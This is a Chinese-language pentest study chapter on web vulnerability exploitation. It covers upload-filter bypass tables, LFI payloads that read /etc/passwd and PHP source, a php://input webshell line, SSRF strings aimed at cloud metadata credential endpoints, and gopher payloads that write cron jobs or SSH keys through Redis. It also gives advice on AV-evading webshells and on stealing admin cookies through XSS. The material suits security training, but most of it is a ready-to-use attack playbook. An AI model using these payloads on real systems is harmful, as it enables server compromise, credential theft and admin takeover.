# Web 漏洞原理与利用（下）—— 文件类、XSS/CSRF、SSRF、逻辑漏洞

> 手法与决策表在本册；上传/包含等**代码根因**见 [`../../代码审计知识库/PHP_代码审计.md`](../../代码审计知识库/PHP_代码审计.md) 及 `INDEX.md` 速查 #3/#4/#29。

## 1. 文件上传

### 绕过手法清单（按防护层级）

| 防护 | 绕过 |
| --- | --- |
| 前端 JS 校验 | 改包/禁用 JS，直接发包 |
| Content-Type 校验 | 改 `Content-Type: image/jpeg` |
| 扩展名黑名单 | 大小写 `pHp`、双写 `pphphp`、点/空格/::$DATA（Windows）、`.phtml .phar .pht .inc`、`.htaccess`/`.user.ini` 打辅助 |
| 白名单 | 解析漏洞：Apache 多后缀 `x.php.xxx`、Nginx `x.jpg/.php`、IIS6 `x.asp;.jpg` 与目录解析 |
| 内容检测 | 图片马（exiftool 注入/gd 二次渲染绕过）、文件头 GIF89a、条件竞争（先传后删窗口期访问） |
| 只验内容不验扩展（框架规则陷阱） | `is_image`/`mime_in` 类只看魔数：`GIF89a` + `shell.php`（CI4 CVE-2026-63223）；内容校验与扩展名/存储名必须**同时**过 |
| 路径控制 | 文件名/路径参数截断 `%00`（旧版）、`../` 穿越指定落盘位置 |

### 落地后的动作
webshell 选内存马/免杀马（03-02）；立刻确认：执行权限、disable_functions、能否出站（决定反弹还是代理）。

## 2. 文件包含（LFI/RFI）

```text
?page=../../../../etc/passwd
?page=php://filter/convert.base64-encode/resource=index.php   # 读源码
?page=php://input  + POST: <?php system($_GET[c]);>           # 需 allow_url_include
?page=phar://uploads/x.jpg/poc.txt                            # phar 反序列化
# 日志包含：UA 写马 → ?page=/var/log/nginx/access.log
# session 包含：PHP_SESSION_UPLOAD_PROGRESS 条件竞争
```

## 3. XSS 与 CSRF

| 类型 | 场景 | 利用 |
| --- | --- | --- |
| 反射型 | 搜索框、报错页 | 钓鱼链接窃取后台 cookie（配合无 HttpOnly） |
| 存储型 | 评论、留言、昵称、工单 | 打后台：beef/xss-platform 收 cookie、键盘记录、蠕虫 |
| DOM 型 | JS 直接写 innerHTML/location | 找 source→sink 链，改 hash 触发 |

关键认知：XSS 的价值在打「后台管理员会话」；有 HttpOnly 时转向「以管理员身份发请求」（CSRF 思路的 XSS 版）——改密码、加管理员、发公告挂马。CSRF 核心是预测表单 + 无 token/弱 token/Referer 校验绕过；CORS 配置错误（反射 Origin + credentials）可整页窃取。

## 4. SSRF

```text
# 基础
http://internal:6379/  http://169.254.169.254/latest/meta-data/iam/security-credentials/
# 绕过
127.0.0.1 → 127.1 / 0x7f000001 / 2130706433 / [::1] / 域名解析到内网（dns rebinding）
短网址、@ 混淆（http://evil@127.0.0.1）、# 片段
# 协议利用
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET...      # 打 Redis 写计划任务/ssh key
dict://127.0.0.1:6379/info                            # 探测
file:///etc/passwd
```

价值排序：云元数据拿临时凭据（见 08）> 打内网 Redis/未授权服务 > 内网端口扫描与指纹。

## 5. 逻辑漏洞（人工为主，工具难替）

| 漏洞 | 测试思路 |
| --- | --- |
| 越权（水平/垂直） | 双账号对比改包：id/uid/orderNo 遍历；低权账号访问高权接口；改 role 参数 |
| 找回密码 | 验证码回显/可爆破（无限制+4 位）、token 可预测、改返回包绕过步骤、账号枚举差异 |
| 支付/订单 | 改金额/数量/运费为 0 或负、改币种、订单状态重放、条件竞争超卖 |
| 验证码 | 万能码、复用不销毁、客户端校验、OCR 可识别 |
| 短信/邮件轰炸 | 无频控 + 无图形码 |
| 条件竞争 | 超发优惠券、多次提现、上传先传后审：并发工具 turbo intruder |

方法论：逻辑漏洞 = 业务流程建模 + 状态机跳跃 + 参数篡改三板斧；把每个接口的「服务端到底信了什么客户端数据」问三遍。

## 自测锚点

- [ ] 能给任意上传点按「防护层级 → 对应绕过」表逐项测试。
- [ ] 能讲清 HttpOnly 存在时 XSS 的三种替代打法。
- [ ] 能用 gopher 手写一条打 Redis 写 ssh key 的 SSRF 载荷。
- [ ] 拿到一个业务系统，能画出核心流程状态机并标出至少 3 个可跳跃点。
